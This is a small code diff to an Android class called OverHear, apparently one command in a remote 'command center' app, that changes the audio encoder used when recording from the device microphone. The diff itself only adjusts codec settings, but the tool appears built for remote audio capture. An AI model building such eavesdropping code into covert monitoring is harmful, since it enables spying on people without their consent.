@@ -2,6 +2,7 @@ package com.theah64.frenemy.android.commandcenter.commands;
 
 import android.content.Context;
 import android.media.MediaRecorder;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 
@@ -48,7 +49,11 @@ public class OverHear extends BaseCommand {
         final MediaRecorder mediaRecorder = new MediaRecorder();
         mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD_MR1) {
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        } else {
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+        }
         mediaRecorder.setAudioEncodingBitRate(16);
         mediaRecorder.setAudioSamplingRate(44100);
         mediaRecorder.setOutputFile(voiceFile.getAbsolutePath());
